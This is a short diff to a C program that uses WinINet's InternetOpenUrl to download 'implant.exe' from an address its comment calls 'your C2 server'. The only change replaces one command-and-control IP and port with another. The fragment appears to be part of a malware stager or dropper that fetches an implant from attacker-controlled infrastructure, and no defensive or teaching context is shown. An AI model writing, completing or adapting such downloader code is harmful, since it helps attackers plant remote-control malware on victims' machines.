@@ -17,7 +17,7 @@ int main(void)
     // 2. Open the URL
     HINTERNET hUrl = InternetOpenUrl(
         hInternet,
-        "http://192.168.1.10:8080/implant.exe", // your C2 server
+        "http://192.168.30.5:8000/implant.exe", // your C2 server
         NULL,                                   // no extra headers
         0,                                      // headers length
         INTERNET_FLAG_RELOAD,                   // don't cache, always fetch fresh
